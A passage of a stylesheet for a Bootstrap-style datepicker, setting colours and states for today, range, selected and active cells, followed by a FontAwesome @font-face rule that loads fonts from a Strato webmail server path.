        .open>.dropdown-toggle.datepicker table tr td.today:hover,
        .open>.dropdown-toggle.datepicker table tr td.today:hover:hover,
        .open>.dropdown-toggle.datepicker table tr td.today.disabled:hover,
        .open>.dropdown-toggle.datepicker table tr td.today.disabled:hover:hover,
        .datepicker table tr td.today:active:focus,
        .datepicker table tr td.today:hover:active:focus,
        .datepicker table tr td.today.disabled:active:focus,
        .datepicker table tr td.today.disabled:hover:active:focus,
        .datepicker table tr td.today.active:focus,
        .datepicker table tr td.today:hover.active:focus,
        .datepicker table tr td.today.disabled.active:focus,
        .datepicker table tr td.today.disabled:hover.active:focus,
        .open>.dropdown-toggle.datepicker table tr td.today:focus,
        .open>.dropdown-toggle.datepicker table tr td.today:hover:focus,
        .open>.dropdown-toggle.datepicker table tr td.today.disabled:focus,
        .open>.dropdown-toggle.datepicker table tr td.today.disabled:hover:focus,
        .datepicker table tr td.today:active.focus,
        .datepicker table tr td.today:hover:active.focus,
        .datepicker table tr td.today.disabled:active.focus,
        .datepicker table tr td.today.disabled:hover:active.focus,
        .datepicker table tr td.today.active.focus,
        .datepicker table tr td.today:hover.active.focus,
        .datepicker table tr td.today.disabled.active.focus,
        .datepicker table tr td.today.disabled:hover.active.focus,
        .open>.dropdown-toggle.datepicker table tr td.today.focus,
        .open>.dropdown-toggle.datepicker table tr td.today:hover.focus,
        .open>.dropdown-toggle.datepicker table tr td.today.disabled.focus,
        .open>.dropdown-toggle.datepicker table tr td.today.disabled:hover.focus {
            color: #000;
            background-color: #ffbc42;
            border-color: #b37400;
        }

        .datepicker table tr td.today.disabled:hover,
        .datepicker table tr td.today:hover.disabled:hover,
        .datepicker table tr td.today.disabled.disabled:hover,
        .datepicker table tr td.today.disabled:hover.disabled:hover,
        .datepicker table tr td.today[disabled]:hover,
        .datepicker table tr td.today:hover[disabled]:hover,
        .datepicker table tr td.today.disabled[disabled]:hover,
        .datepicker table tr td.today.disabled:hover[disabled]:hover,
        fieldset[disabled] .datepicker table tr td.today:hover,
        fieldset[disabled] .datepicker table tr td.today:hover:hover,
        fieldset[disabled] .datepicker table tr td.today.disabled:hover,
        fieldset[disabled] .datepicker table tr td.today.disabled:hover:hover,
        .datepicker table tr td.today.disabled:focus,
        .datepicker table tr td.today:hover.disabled:focus,
        .datepicker table tr td.today.disabled.disabled:focus,
        .datepicker table tr td.today.disabled:hover.disabled:focus,
        .datepicker table tr td.today[disabled]:focus,
        .datepicker table tr td.today:hover[disabled]:focus,
        .datepicker table tr td.today.disabled[disabled]:focus,
        .datepicker table tr td.today.disabled:hover[disabled]:focus,
        fieldset[disabled] .datepicker table tr td.today:focus,
        fieldset[disabled] .datepicker table tr td.today:hover:focus,
        fieldset[disabled] .datepicker table tr td.today.disabled:focus,
        fieldset[disabled] .datepicker table tr td.today.disabled:hover:focus,
        .datepicker table tr td.today.disabled.focus,
        .datepicker table tr td.today:hover.disabled.focus,
        .datepicker table tr td.today.disabled.disabled.focus,
        .datepicker table tr td.today.disabled:hover.disabled.focus,
        .datepicker table tr td.today[disabled].focus,
        .datepicker table tr td.today:hover[disabled].focus,
        .datepicker table tr td.today.disabled[disabled].focus,
        .datepicker table tr td.today.disabled:hover[disabled].focus,
        fieldset[disabled] .datepicker table tr td.today.focus,
        fieldset[disabled] .datepicker table tr td.today:hover.focus,
        fieldset[disabled] .datepicker table tr td.today.disabled.focus,
        fieldset[disabled] .datepicker table tr td.today.disabled:hover.focus {
            background-color: #ffdb99;
            border-color: #ffb733;
        }

        .datepicker table tr td.today .badge,
        .datepicker table tr td.today:hover .badge,
        .datepicker table tr td.today.disabled .badge,
        .datepicker table tr td.today.disabled:hover .badge {
            color: #ffdb99;
            background-color: #000;
        }

        .datepicker table tr td.today:hover:hover {
            color: #000;
        }

        .datepicker table tr td.today.active:hover {
            color: #fff;
        }

        .datepicker table tr td.range,
        .datepicker table tr td.range:hover,
        .datepicker table tr td.range.disabled,
        .datepicker table tr td.range.disabled:hover {
            background: #eee;
            border-radius: 0;
        }

        .datepicker table tr td.range.today,
        .datepicker table tr td.range.today:hover,
        .datepicker table tr td.range.today.disabled,
        .datepicker table tr td.range.today.disabled:hover {
            color: #000;
            background-color: #f7ca77;
            border-color: #f1a417;
            border-radius: 0;
        }

        .datepicker table tr td.range.today:focus,
        .datepicker table tr td.range.today:hover:focus,
        .datepicker table tr td.range.today.disabled:focus,
        .datepicker table tr td.range.today.disabled:hover:focus,
        .datepicker table tr td.range.today.focus,
        .datepicker table tr td.range.today:hover.focus,
        .datepicker table tr td.range.today.disabled.focus,
        .datepicker table tr td.range.today.disabled:hover.focus {
            color: #000;
            background-color: #f4b747;
            border-color: #815608;
        }

        .datepicker table tr td.range.today:hover,
        .datepicker table tr td.range.today:hover:hover,
        .datepicker table tr td.range.today.disabled:hover,
        .datepicker table tr td.range.today.disabled:hover:hover {
            color: #000;
            background-color: #f4b747;
            border-color: #bf800c;
        }

        .datepicker table tr td.range.today:active,
        .datepicker table tr td.range.today:hover:active,
        .datepicker table tr td.range.today.disabled:active,
        .datepicker table tr td.range.today.disabled:hover:active,
        .datepicker table tr td.range.today.active,
        .datepicker table tr td.range.today:hover.active,
        .datepicker table tr td.range.today.disabled.active,
        .datepicker table tr td.range.today.disabled:hover.active,
        .open>.dropdown-toggle.datepicker table tr td.range.today,
        .open>.dropdown-toggle.datepicker table tr td.range.today:hover,
        .open>.dropdown-toggle.datepicker table tr td.range.today.disabled,
        .open>.dropdown-toggle.datepicker table tr td.range.today.disabled:hover {
            color: #000;
            background-color: #f4b747;
            background-image: none;
            border-color: #bf800c;
        }

        .datepicker table tr td.range.today:active:hover,
        .datepicker table tr td.range.today:hover:active:hover,
        .datepicker table tr td.range.today.disabled:active:hover,
        .datepicker table tr td.range.today.disabled:hover:active:hover,
        .datepicker table tr td.range.today.active:hover,
        .datepicker table tr td.range.today:hover.active:hover,
        .datepicker table tr td.range.today.disabled.active:hover,
        .datepicker table tr td.range.today.disabled:hover.active:hover,
        .open>.dropdown-toggle.datepicker table tr td.range.today:hover,
        .open>.dropdown-toggle.datepicker table tr td.range.today:hover:hover,
        .open>.dropdown-toggle.datepicker table tr td.range.today.disabled:hover,
        .open>.dropdown-toggle.datepicker table tr td.range.today.disabled:hover:hover,
        .datepicker table tr td.range.today:active:focus,
        .datepicker table tr td.range.today:hover:active:focus,
        .datepicker table tr td.range.today.disabled:active:focus,
        .datepicker table tr td.range.today.disabled:hover:active:focus,
        .datepicker table tr td.range.today.active:focus,
        .datepicker table tr td.range.today:hover.active:focus,
        .datepicker table tr td.range.today.disabled.active:focus,
        .datepicker table tr td.range.today.disabled:hover.active:focus,
        .open>.dropdown-toggle.datepicker table tr td.range.today:focus,
        .open>.dropdown-toggle.datepicker table tr td.range.today:hover:focus,
        .open>.dropdown-toggle.datepicker table tr td.range.today.disabled:focus,
        .open>.dropdown-toggle.datepicker table tr td.range.today.disabled:hover:focus,
        .datepicker table tr td.range.today:active.focus,
        .datepicker table tr td.range.today:hover:active.focus,
        .datepicker table tr td.range.today.disabled:active.focus,
        .datepicker table tr td.range.today.disabled:hover:active.focus,
        .datepicker table tr td.range.today.active.focus,
        .datepicker table tr td.range.today:hover.active.focus,
        .datepicker table tr td.range.today.disabled.active.focus,
        .datepicker table tr td.range.today.disabled:hover.active.focus,
        .open>.dropdown-toggle.datepicker table tr td.range.today.focus,
        .open>.dropdown-toggle.datepicker table tr td.range.today:hover.focus,
        .open>.dropdown-toggle.datepicker table tr td.range.today.disabled.focus,
        .open>.dropdown-toggle.datepicker table tr td.range.today.disabled:hover.focus {
            color: #000;
            background-color: #f2aa25;
            border-color: #815608;
        }

        .datepicker table tr td.range.today.disabled:hover,
        .datepicker table tr td.range.today:hover.disabled:hover,
        .datepicker table tr td.range.today.disabled.disabled:hover,
        .datepicker table tr td.range.today.disabled:hover.disabled:hover,
        .datepicker table tr td.range.today[disabled]:hover,
        .datepicker table tr td.range.today:hover[disabled]:hover,
        .datepicker table tr td.range.today.disabled[disabled]:hover,
        .datepicker table tr td.range.today.disabled:hover[disabled]:hover,
        fieldset[disabled] .datepicker table tr td.range.today:hover,
        fieldset[disabled] .datepicker table tr td.range.today:hover:hover,
        fieldset[disabled] .datepicker table tr td.range.today.disabled:hover,
        fieldset[disabled] .datepicker table tr td.range.today.disabled:hover:hover,
        .datepicker table tr td.range.today.disabled:focus,
        .datepicker table tr td.range.today:hover.disabled:focus,
        .datepicker table tr td.range.today.disabled.disabled:focus,
        .datepicker table tr td.range.today.disabled:hover.disabled:focus,
        .datepicker table tr td.range.today[disabled]:focus,
        .datepicker table tr td.range.today:hover[disabled]:focus,
        .datepicker table tr td.range.today.disabled[disabled]:focus,
        .datepicker table tr td.range.today.disabled:hover[disabled]:focus,
        fieldset[disabled] .datepicker table tr td.range.today:focus,
        fieldset[disabled] .datepicker table tr td.range.today:hover:focus,
        fieldset[disabled] .datepicker table tr td.range.today.disabled:focus,
        fieldset[disabled] .datepicker table tr td.range.today.disabled:hover:focus,
        .datepicker table tr td.range.today.disabled.focus,
        .datepicker table tr td.range.today:hover.disabled.focus,
        .datepicker table tr td.range.today.disabled.disabled.focus,
        .datepicker table tr td.range.today.disabled:hover.disabled.focus,
        .datepicker table tr td.range.today[disabled].focus,
        .datepicker table tr td.range.today:hover[disabled].focus,
        .datepicker table tr td.range.today.disabled[disabled].focus,
        .datepicker table tr td.range.today.disabled:hover[disabled].focus,
        fieldset[disabled] .datepicker table tr td.range.today.focus,
        fieldset[disabled] .datepicker table tr td.range.today:hover.focus,
        fieldset[disabled] .datepicker table tr td.range.today.disabled.focus,
        fieldset[disabled] .datepicker table tr td.range.today.disabled:hover.focus {
            background-color: #f7ca77;
            border-color: #f1a417;
        }

        .datepicker table tr td.range.today .badge,
        .datepicker table tr td.range.today:hover .badge,
        .datepicker table tr td.range.today.disabled .badge,
        .datepicker table tr td.range.today.disabled:hover .badge {
            color: #f7ca77;
            background-color: #000;
        }

        .datepicker table tr td.selected,
        .datepicker table tr td.selected:hover,
        .datepicker table tr td.selected.disabled,
        .datepicker table tr td.selected.disabled:hover {
            color: #fff;
            background-color: #777;
            border-color: #555;
            text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);
        }

        .datepicker table tr td.selected:focus,
        .datepicker table tr td.selected:hover:focus,
        .datepicker table tr td.selected.disabled:focus,
        .datepicker table tr td.selected.disabled:hover:focus,
        .datepicker table tr td.selected.focus,
        .datepicker table tr td.selected:hover.focus,
        .datepicker table tr td.selected.disabled.focus,
        .datepicker table tr td.selected.disabled:hover.focus {
            color: #fff;
            background-color: #5e5e5e;
            border-color: #151515;
        }

        .datepicker table tr td.selected:hover,
        .datepicker table tr td.selected:hover:hover,
        .datepicker table tr td.selected.disabled:hover,
        .datepicker table tr td.selected.disabled:hover:hover {
            color: #fff;
            background-color: #5e5e5e;
            border-color: #363636;
        }

        .datepicker table tr td.selected:active,
        .datepicker table tr td.selected:hover:active,
        .datepicker table tr td.selected.disabled:active,
        .datepicker table tr td.selected.disabled:hover:active,
        .datepicker table tr td.selected.active,
        .datepicker table tr td.selected:hover.active,
        .datepicker table tr td.selected.disabled.active,
        .datepicker table tr td.selected.disabled:hover.active,
        .open>.dropdown-toggle.datepicker table tr td.selected,
        .open>.dropdown-toggle.datepicker table tr td.selected:hover,
        .open>.dropdown-toggle.datepicker table tr td.selected.disabled,
        .open>.dropdown-toggle.datepicker table tr td.selected.disabled:hover {
            color: #fff;
            background-color: #5e5e5e;
            background-image: none;
            border-color: #363636;
        }

        .datepicker table tr td.selected:active:hover,
        .datepicker table tr td.selected:hover:active:hover,
        .datepicker table tr td.selected.disabled:active:hover,
        .datepicker table tr td.selected.disabled:hover:active:hover,
        .datepicker table tr td.selected.active:hover,
        .datepicker table tr td.selected:hover.active:hover,
        .datepicker table tr td.selected.disabled.active:hover,
        .datepicker table tr td.selected.disabled:hover.active:hover,
        .open>.dropdown-toggle.datepicker table tr td.selected:hover,
        .open>.dropdown-toggle.datepicker table tr td.selected:hover:hover,
        .open>.dropdown-toggle.datepicker table tr td.selected.disabled:hover,
        .open>.dropdown-toggle.datepicker table tr td.selected.disabled:hover:hover,
        .datepicker table tr td.selected:active:focus,
        .datepicker table tr td.selected:hover:active:focus,
        .datepicker table tr td.selected.disabled:active:focus,
        .datepicker table tr td.selected.disabled:hover:active:focus,
        .datepicker table tr td.selected.active:focus,
        .datepicker table tr td.selected:hover.active:focus,
        .datepicker table tr td.selected.disabled.active:focus,
        .datepicker table tr td.selected.disabled:hover.active:focus,
        .open>.dropdown-toggle.datepicker table tr td.selected:focus,
        .open>.dropdown-toggle.datepicker table tr td.selected:hover:focus,
        .open>.dropdown-toggle.datepicker table tr td.selected.disabled:focus,
        .open>.dropdown-toggle.datepicker table tr td.selected.disabled:hover:focus,
        .datepicker table tr td.selected:active.focus,
        .datepicker table tr td.selected:hover:active.focus,
        .datepicker table tr td.selected.disabled:active.focus,
        .datepicker table tr td.selected.disabled:hover:active.focus,
        .datepicker table tr td.selected.active.focus,
        .datepicker table tr td.selected:hover.active.focus,
        .datepicker table tr td.selected.disabled.active.focus,
        .datepicker table tr td.selected.disabled:hover.active.focus,
        .open>.dropdown-toggle.datepicker table tr td.selected.focus,
        .open>.dropdown-toggle.datepicker table tr td.selected:hover.focus,
        .open>.dropdown-toggle.datepicker table tr td.selected.disabled.focus,
        .open>.dropdown-toggle.datepicker table tr td.selected.disabled:hover.focus {
            color: #fff;
            background-color: #4c4c4c;
            border-color: #151515;
        }

        .datepicker table tr td.selected.disabled:hover,
        .datepicker table tr td.selected:hover.disabled:hover,
        .datepicker table tr td.selected.disabled.disabled:hover,
        .datepicker table tr td.selected.disabled:hover.disabled:hover,
        .datepicker table tr td.selected[disabled]:hover,
        .datepicker table tr td.selected:hover[disabled]:hover,
        .datepicker table tr td.selected.disabled[disabled]:hover,
        .datepicker table tr td.selected.disabled:hover[disabled]:hover,
        fieldset[disabled] .datepicker table tr td.selected:hover,
        fieldset[disabled] .datepicker table tr td.selected:hover:hover,
        fieldset[disabled] .datepicker table tr td.selected.disabled:hover,
        fieldset[disabled] .datepicker table tr td.selected.disabled:hover:hover,
        .datepicker table tr td.selected.disabled:focus,
        .datepicker table tr td.selected:hover.disabled:focus,
        .datepicker table tr td.selected.disabled.disabled:focus,
        .datepicker table tr td.selected.disabled:hover.disabled:focus,
        .datepicker table tr td.selected[disabled]:focus,
        .datepicker table tr td.selected:hover[disabled]:focus,
        .datepicker table tr td.selected.disabled[disabled]:focus,
        .datepicker table tr td.selected.disabled:hover[disabled]:focus,
        fieldset[disabled] .datepicker table tr td.selected:focus,
        fieldset[disabled] .datepicker table tr td.selected:hover:focus,
        fieldset[disabled] .datepicker table tr td.selected.disabled:focus,
        fieldset[disabled] .datepicker table tr td.selected.disabled:hover:focus,
        .datepicker table tr td.selected.disabled.focus,
        .datepicker table tr td.selected:hover.disabled.focus,
        .datepicker table tr td.selected.disabled.disabled.focus,
        .datepicker table tr td.selected.disabled:hover.disabled.focus,
        .datepicker table tr td.selected[disabled].focus,
        .datepicker table tr td.selected:hover[disabled].focus,
        .datepicker table tr td.selected.disabled[disabled].focus,
        .datepicker table tr td.selected.disabled:hover[disabled].focus,
        fieldset[disabled] .datepicker table tr td.selected.focus,
        fieldset[disabled] .datepicker table tr td.selected:hover.focus,
        fieldset[disabled] .datepicker table tr td.selected.disabled.focus,
        fieldset[disabled] .datepicker table tr td.selected.disabled:hover.focus {
            background-color: #777;
            border-color: #555;
        }

        .datepicker table tr td.selected .badge,
        .datepicker table tr td.selected:hover .badge,
        .datepicker table tr td.selected.disabled .badge,
        .datepicker table tr td.selected.disabled:hover .badge {
            color: #777;
            background-color: #fff;
        }

        .datepicker table tr td.active,
        .datepicker table tr td.active:hover,
        .datepicker table tr td.active.disabled,
        .datepicker table tr td.active.disabled:hover {
            color: #fff;
            background-color: #07b;
            border-color: #0067a2;
            text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);
        }

        .datepicker table tr td.active:focus,
        .datepicker table tr td.active:hover:focus,
        .datepicker table tr td.active.disabled:focus,
        .datepicker table tr td.active.disabled:hover:focus,
        .datepicker table tr td.active.focus,
        .datepicker table tr td.active:hover.focus,
        .datepicker table tr td.active.disabled.focus,
        .datepicker table tr td.active.disabled:hover.focus {
            color: #fff;
            background-color: #005788;
            border-color: #001622;
        }

        .datepicker table tr td.active:hover,
        .datepicker table tr td.active:hover:hover,
        .datepicker table tr td.active.disabled:hover,
        .datepicker table tr td.active.disabled:hover:hover {
            color: #fff;
            background-color: #005788;
            border-color: #004064;
        }

        .datepicker table tr td.active:active,
        .datepicker table tr td.active:hover:active,
        .datepicker table tr td.active.disabled:active,
        .datepicker table tr td.active.disabled:hover:active,
        .datepicker table tr td.active.active,
        .datepicker table tr td.active:hover.active,
        .datepicker table tr td.active.disabled.active,
        .datepicker table tr td.active.disabled:hover.active,
        .open>.dropdown-toggle.datepicker table tr td.active,
        .open>.dropdown-toggle.datepicker table tr td.active:hover,
        .open>.dropdown-toggle.datepicker table tr td.active.disabled,
        .open>.dropdown-toggle.datepicker table tr td.active.disabled:hover {
            color: #fff;
            background-color: #005788;
            background-image: none;
            border-color: #004064;
        }

        .datepicker table tr td.active:active:hover,
        .datepicker table tr td.active:hover:active:hover,
        .datepicker table tr td.active.disabled:active:hover,
        .datepicker table tr td.active.disabled:hover:active:hover,
        .datepicker table tr td.active.active:hover,
        .datepicker table tr td.active:hover.active:hover,
        .datepicker table tr td.active.disabled.active:hover,
        .datepicker table tr td.active.disabled:hover.active:hover,
        .open>.dropdown-toggle.datepicker table tr td.active:hover,
        .open>.dropdown-toggle.datepicker table tr td.active:hover:hover,
        .open>.dropdown-toggle.datepicker table tr td.active.disabled:hover,
        .open>.dropdown-toggle.datepicker table tr td.active.disabled:hover:hover,
        .datepicker table tr td.active:active:focus,
        .datepicker table tr td.active:hover:active:focus,
        .datepicker table tr td.active.disabled:active:focus,
        .datepicker table tr td.active.disabled:hover:active:focus,
        .datepicker table tr td.active.active:focus,
        .datepicker table tr td.active:hover.active:focus,
        .datepicker table tr td.active.disabled.active:focus,
        .datepicker table tr td.active.disabled:hover.active:focus,
        .open>.dropdown-toggle.datepicker table tr td.active:focus,
        .open>.dropdown-toggle.datepicker table tr td.active:hover:focus,
        .open>.dropdown-toggle.datepicker table tr td.active.disabled:focus,
        .open>.dropdown-toggle.datepicker table tr td.active.disabled:hover:focus,
        .datepicker table tr td.active:active.focus,
        .datepicker table tr td.active:hover:active.focus,
        .datepicker table tr td.active.disabled:active.focus,
        .datepicker table tr td.active.disabled:hover:active.focus,
        .datepicker table tr td.active.active.focus,
        .datepicker table tr td.active:hover.active.focus,
        .datepicker table tr td.active.disabled.active.focus,
        .datepicker table tr td.active.disabled:hover.active.focus,
        .open>.dropdown-toggle.datepicker table tr td.active.focus,
        .open>.dropdown-toggle.datepicker table tr td.active:hover.focus,
        .open>.dropdown-toggle.datepicker table tr td.active.disabled.focus,
        .open>.dropdown-toggle.datepicker table tr td.active.disabled:hover.focus {
            color: #fff;
            background-color: #004064;
            border-color: #001622;
        }

        .datepicker table tr td.active.disabled:hover,
        .datepicker table tr td.active:hover.disabled:hover,
        .datepicker table tr td.active.disabled.disabled:hover,
        .datepicker table tr td.active.disabled:hover.disabled:hover,
        .datepicker table tr td.active[disabled]:hover,
        .datepicker table tr td.active:hover[disabled]:hover,
        .datepicker table tr td.active.disabled[disabled]:hover,
        .datepicker table tr td.active.disabled:hover[disabled]:hover,
        fieldset[disabled] .datepicker table tr td.active:hover,
        fieldset[disabled] .datepicker table tr td.active:hover:hover,
        fieldset[disabled] .datepicker table tr td.active.disabled:hover,
        fieldset[disabled] .datepicker table tr td.active.disabled:hover:hover,
        .datepicker table tr td.active.disabled:focus,
        .datepicker table tr td.active:hover.disabled:focus,
        .datepicker table tr td.active.disabled.disabled:focus,
        .datepicker table tr td.active.disabled:hover.disabled:focus,
        .datepicker table tr td.active[disabled]:focus,
        .datepicker table tr td.active:hover[disabled]:focus,
        .datepicker table tr td.active.disabled[disabled]:focus,
        .datepicker table tr td.active.disabled:hover[disabled]:focus,
        fieldset[disabled] .datepicker table tr td.active:focus,
        fieldset[disabled] .datepicker table tr td.active:hover:focus,
        fieldset[disabled] .datepicker table tr td.active.disabled:focus,
        fieldset[disabled] .datepicker table tr td.active.disabled:hover:focus,
        .datepicker table tr td.active.disabled.focus,
        .datepicker table tr td.active:hover.disabled.focus,
        .datepicker table tr td.active.disabled.disabled.focus,
        .datepicker table tr td.active.disabled:hover.disabled.focus,
        .datepicker table tr td.active[disabled].focus,
        .datepicker table tr td.active:hover[disabled].focus,
        .datepicker table tr td.active.disabled[disabled].focus,
        .datepicker table tr td.active.disabled:hover[disabled].focus,
        fieldset[disabled] .datepicker table tr td.active.focus,
        fieldset[disabled] .datepicker table tr td.active:hover.focus,
        fieldset[disabled] .datepicker table tr td.active.disabled.focus,
        fieldset[disabled] .datepicker table tr td.active.disabled:hover.focus {
            background-color: #07b;
            border-color: #0067a2;
        }

        .datepicker table tr td.active .badge,
        .datepicker table tr td.active:hover .badge,
        .datepicker table tr td.active.disabled .badge,
        .datepicker table tr td.active.disabled:hover .badge {
            color: #07b;
            background-color: #fff;
        }

        .datepicker table tr td span {
            display: block;
            width: 23%;
            height: 54px;
            line-height: 54px;
            float: left;
            margin: 1%;
            cursor: pointer;
            border-radius: 4px;
        }

        .datepicker table tr td span:hover {
            background: #eee;
        }

        .datepicker table tr td span.disabled,
        .datepicker table tr td span.disabled:hover {
            background: none;
            color: #777;
            cursor: default;
        }

        .datepicker table tr td span.active,
        .datepicker table tr td span.active:hover,
        .datepicker table tr td span.active.disabled,
        .datepicker table tr td span.active.disabled:hover {
            color: #fff;
            background-color: #07b;
            border-color: #0067a2;
            text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);
        }

        .datepicker table tr td span.active:focus,
        .datepicker table tr td span.active:hover:focus,
        .datepicker table tr td span.active.disabled:focus,
        .datepicker table tr td span.active.disabled:hover:focus,
        .datepicker table tr td span.active.focus,
        .datepicker table tr td span.active:hover.focus,
        .datepicker table tr td span.active.disabled.focus,
        .datepicker table tr td span.active.disabled:hover.focus {
            color: #fff;
            background-color: #005788;
            border-color: #001622;
        }

        .datepicker table tr td span.active:hover,
        .datepicker table tr td span.active:hover:hover,
        .datepicker table tr td span.active.disabled:hover,
        .datepicker table tr td span.active.disabled:hover:hover {
            color: #fff;
            background-color: #005788;
            border-color: #004064;
        }

        .datepicker table tr td span.active:active,
        .datepicker table tr td span.active:hover:active,
        .datepicker table tr td span.active.disabled:active,
        .datepicker table tr td span.active.disabled:hover:active,
        .datepicker table tr td span.active.active,
        .datepicker table tr td span.active:hover.active,
        .datepicker table tr td span.active.disabled.active,
        .datepicker table tr td span.active.disabled:hover.active,
        .open>.dropdown-toggle.datepicker table tr td span.active,
        .open>.dropdown-toggle.datepicker table tr td span.active:hover,
        .open>.dropdown-toggle.datepicker table tr td span.active.disabled,
        .open>.dropdown-toggle.datepicker table tr td span.active.disabled:hover {
            color: #fff;
            background-color: #005788;
            background-image: none;
            border-color: #004064;
        }

        .datepicker table tr td span.active:active:hover,
        .datepicker table tr td span.active:hover:active:hover,
        .datepicker table tr td span.active.disabled:active:hover,
        .datepicker table tr td span.active.disabled:hover:active:hover,
        .datepicker table tr td span.active.active:hover,
        .datepicker table tr td span.active:hover.active:hover,
        .datepicker table tr td span.active.disabled.active:hover,
        .datepicker table tr td span.active.disabled:hover.active:hover,
        .open>.dropdown-toggle.datepicker table tr td span.active:hover,
        .open>.dropdown-toggle.datepicker table tr td span.active:hover:hover,
        .open>.dropdown-toggle.datepicker table tr td span.active.disabled:hover,
        .open>.dropdown-toggle.datepicker table tr td span.active.disabled:hover:hover,
        .datepicker table tr td span.active:active:focus,
        .datepicker table tr td span.active:hover:active:focus,
        .datepicker table tr td span.active.disabled:active:focus,
        .datepicker table tr td span.active.disabled:hover:active:focus,
        .datepicker table tr td span.active.active:focus,
        .datepicker table tr td span.active:hover.active:focus,
        .datepicker table tr td span.active.disabled.active:focus,
        .datepicker table tr td span.active.disabled:hover.active:focus,
        .open>.dropdown-toggle.datepicker table tr td span.active:focus,
        .open>.dropdown-toggle.datepicker table tr td span.active:hover:focus,
        .open>.dropdown-toggle.datepicker table tr td span.active.disabled:focus,
        .open>.dropdown-toggle.datepicker table tr td span.active.disabled:hover:focus,
        .datepicker table tr td span.active:active.focus,
        .datepicker table tr td span.active:hover:active.focus,
        .datepicker table tr td span.active.disabled:active.focus,
        .datepicker table tr td span.active.disabled:hover:active.focus,
        .datepicker table tr td span.active.active.focus,
        .datepicker table tr td span.active:hover.active.focus,
        .datepicker table tr td span.active.disabled.active.focus,
        .datepicker table tr td span.active.disabled:hover.active.focus,
        .open>.dropdown-toggle.datepicker table tr td span.active.focus,
        .open>.dropdown-toggle.datepicker table tr td span.active:hover.focus,
        .open>.dropdown-toggle.datepicker table tr td span.active.disabled.focus,
        .open>.dropdown-toggle.datepicker table tr td span.active.disabled:hover.focus {
            color: #fff;
            background-color: #004064;
            border-color: #001622;
        }

        .datepicker table tr td span.active.disabled:hover,
        .datepicker table tr td span.active:hover.disabled:hover,
        .datepicker table tr td span.active.disabled.disabled:hover,
        .datepicker table tr td span.active.disabled:hover.disabled:hover,
        .datepicker table tr td span.active[disabled]:hover,
        .datepicker table tr td span.active:hover[disabled]:hover,
        .datepicker table tr td span.active.disabled[disabled]:hover,
        .datepicker table tr td span.active.disabled:hover[disabled]:hover,
        fieldset[disabled] .datepicker table tr td span.active:hover,
        fieldset[disabled] .datepicker table tr td span.active:hover:hover,
        fieldset[disabled] .datepicker table tr td span.active.disabled:hover,
        fieldset[disabled] .datepicker table tr td span.active.disabled:hover:hover,
        .datepicker table tr td span.active.disabled:focus,
        .datepicker table tr td span.active:hover.disabled:focus,
        .datepicker table tr td span.active.disabled.disabled:focus,
        .datepicker table tr td span.active.disabled:hover.disabled:focus,
        .datepicker table tr td span.active[disabled]:focus,
        .datepicker table tr td span.active:hover[disabled]:focus,
        .datepicker table tr td span.active.disabled[disabled]:focus,
        .datepicker table tr td span.active.disabled:hover[disabled]:focus,
        fieldset[disabled] .datepicker table tr td span.active:focus,
        fieldset[disabled] .datepicker table tr td span.active:hover:focus,
        fieldset[disabled] .datepicker table tr td span.active.disabled:focus,
        fieldset[disabled] .datepicker table tr td span.active.disabled:hover:focus,
        .datepicker table tr td span.active.disabled.focus,
        .datepicker table tr td span.active:hover.disabled.focus,
        .datepicker table tr td span.active.disabled.disabled.focus,
        .datepicker table tr td span.active.disabled:hover.disabled.focus,
        .datepicker table tr td span.active[disabled].focus,
        .datepicker table tr td span.active:hover[disabled].focus,
        .datepicker table tr td span.active.disabled[disabled].focus,
        .datepicker table tr td span.active.disabled:hover[disabled].focus,
        fieldset[disabled] .datepicker table tr td span.active.focus,
        fieldset[disabled] .datepicker table tr td span.active:hover.focus,
        fieldset[disabled] .datepicker table tr td span.active.disabled.focus,
        fieldset[disabled] .datepicker table tr td span.active.disabled:hover.focus {
            background-color: #07b;
            border-color: #0067a2;
        }

        .datepicker table tr td span.active .badge,
        .datepicker table tr td span.active:hover .badge,
        .datepicker table tr td span.active.disabled .badge,
        .datepicker table tr td span.active.disabled:hover .badge {
            color: #07b;
            background-color: #fff;
        }

        .datepicker table tr td span.old,
        .datepicker table tr td span.new {
            color: #777;
        }

        .datepicker th.datepicker-switch {
            width: 145px;
        }

        .datepicker thead tr:first-child th,
        .datepicker tfoot tr th {
            cursor: pointer;
        }

        .datepicker thead tr:first-child th:hover,
        .datepicker tfoot tr th:hover {
            background: #eee;
        }

        .datepicker .cw {
            font-size: 10px;
            width: 12px;
            padding: 0 2px 0 5px;
            vertical-align: middle;
        }

        .datepicker thead tr:first-child th.cw {
            cursor: default;
            background-color: transparent;
        }

        .input-group.date .input-group-addon i {
            cursor: pointer;
        }

        .input-daterange input {
            text-align: center;
        }

        .input-daterange input:first-child {
            border-radius: 3px 0 0 3px;
        }

        .input-daterange input:last-child {
            border-radius: 0 3px 3px 0;
        }

        .input-daterange .input-group-addon {
            width: auto;
            min-width: 16px;
            padding: 4px 5px;
            font-weight: normal;
            line-height: 1.42857143;
            text-align: center;
            text-shadow: 0 1px 0 #fff;
            vertical-align: middle;
            background-color: #eee;
            border: solid #ccc;
            border-width: 1px 0;
            margin-left: -5px;
            margin-right: -5px;
        }

        @font-face {
            font-family: "FontAwesome";
            src: url("https://webmail.strato.com/appsuite/v=7.10.5-33.20220405.070458/apps/3rd.party/font-awesome/fonts/fontawesome-webfont.eot?v=4.7.0");
            src: url("https://webmail.strato.com/appsuite/v=7.10.5-33.20220405.070458/apps/3rd.party/font-awesome/fonts/fontawesome-webfont.eot?#iefix&v=4.7.0") format("embedded-opentype"), url("https://webmail.strato.com/appsuite/v=7.10.5-33.20220405.070458/apps/3rd.party/font-awesome/fonts/fontawesome-webfont.woff2?v=4.7.0") format("woff2"), url("https://webmail.strato.com/appsuite/v=7.10.5-33.20220405.070458/apps/3rd.party/font-awesome/fonts/fontawesome-webfont.woff?v=4.7.0") format("woff"), url("https://webmail.strato.com/appsuite/v=7.10.5-33.20220405.070458/apps/3rd.party/font-awesome/fonts/fontawesome-webfont.ttf?v=4.7.0") format("truetype"), url("https://webmail.strato.com/appsuite/v=7.10.5-33.20220405.070458/apps/3rd.party/font-awesome/fonts/fontawesome-webfont.svg?v=4.7.0#fontawesomeregular") format("svg");
            font-weight: normal;
            font-style: normal;
        }

        .fa {
            display: inline-block;
            font: normal normal normal 14px/1 FontAwesome;
            font-size: inherit;
            text-rendering: auto;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

